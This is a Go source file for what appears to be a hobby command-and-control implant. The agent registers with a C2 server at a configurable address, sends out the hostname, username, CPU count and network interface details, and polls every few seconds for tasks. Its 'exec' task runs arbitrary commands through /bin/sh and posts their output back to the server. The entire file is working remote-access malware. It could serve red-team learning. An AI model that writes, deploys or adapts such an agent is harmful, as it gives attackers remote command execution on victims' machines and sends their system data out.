package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"

	"github.com/jasonlvhit/gocron"
)

var (
	c2        = "127.0.0.1"
	port      = "8080"
	server    string
	sleeptime uint64 = 10
	id        string
	hostname  string
	username  string
)

func main() {
	netInfo()
	server = "http://" + c2 + ":" + port

	// get hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "UNKNOWN"
	}

	// get username
	user, err := user.Current()
	if err != nil {
		user.Username = "UNKNOWN"
	}
	username = user.Username
	registerAgent(server, hostname, username)
}

func registerAgent(server string, hostname string, username string) {
	data := url.Values{
		"hostname": {hostname},
		"username": {username},
	}

	resp, err := http.PostForm(server+"/register", data)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	id = string(body)
	fmt.Println(id)
	startAgent()
}

func startAgent() {
	gocron.Every(sleeptime).Seconds().Do(checkIn)
	<-gocron.Start()
}

func checkIn() {
	//checkin will show that the agent is still connected and retrieve any new tasks
	data := url.Values{
		"id": {id},
	}
	resp, err := http.PostForm(server+"/tasks", data)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	if string(body) == "" {
		fmt.Println("No new tasks!")
	} else {
		fmt.Println("Received Task: ", string(body))
		processTask(string(body))
	}

}

func processTask(task string) {
	if task == "getuid" {
		getUID(id)
	} else if strings.HasPrefix(task, "sleep") {
		adjustSleep(strings.Fields(task)[1])
	} else if task == "sysinfo" {
		getSysinfo()
	} else if task == "netinfo" {
		netInfo()
	} else if strings.HasPrefix(task, "exec") {
		if len(strings.Fields(task)) < 2 {
			return
		}
		execute(strings.Fields(task)[1:])
	}
}

func getUID(id string) {
	hostname, _ = os.Hostname()
	test, _ := user.Current()
	username = test.Username
	uid := username + "@" + hostname
	data := url.Values{
		"id":     {id},
		"output": {uid},
	}
	fmt.Println("Sending data: " + uid)
	resp, err := http.PostForm(server+"/results", data)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func adjustSleep(time string) {
	sleepval, err := strconv.ParseUint(string(time), 10, 64)
	if err != nil {
		return
	} else {
		defer startAgent()
		gocron.Clear()
		sleeptime = sleepval
	}
}

func getSysinfo() {
	cpus := runtime.NumCPU()
	output := "Num CPUs: " + fmt.Sprint(cpus)
	data := url.Values{
		"id":     {id},
		"output": {output},
	}
	fmt.Println("Sending data: " + output)
	resp, err := http.PostForm(server+"/results", data)
	if err != nil {
		return
	}
	defer resp.Body.Close()

}

func execute(command []string) {
	c := strings.Join(command, " ")
	var outb, errb bytes.Buffer
	cmd := exec.Command("/bin/sh", "-c", c)
	cmd.Stdin = os.Stdin
	cmd.Stdout = &outb
	cmd.Stderr = &errb
	err := cmd.Run()
	if err != nil {
		fmt.Println(err)
	}
	data := url.Values{
		"id":     {id},
		"output": {outb.String()},
	}
	fmt.Println("Sending output:", outb.String())
	resp, err := http.PostForm(server+"/results", data)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func netInfo() {
	netInterfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println(err)
	}
	var interfaceInfo = make(map[string]string)
	for _, netInterfaceName := range netInterfaces {
		name := netInterfaceName.Name
		netInterfaceTmp, _ := net.InterfaceByName(netInterfaceName.Name) // what am i even doing rn
		addresses, _ := netInterfaceTmp.Addrs()
		if len(addresses) < 1 {
			interfaceInfo[name] = "No Address"
		} else {
			interfaceInfo[name] = addresses[0].String()
		}
	}
	b := new(bytes.Buffer)
	for key, value := range interfaceInfo {
		fmt.Fprintf(b, "%s : %s\n", key, value)
	}
	data := url.Values{
		"id":     {id},
		"output": {b.String()},
	}
	resp, err := http.PostForm(server+"/results", data)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
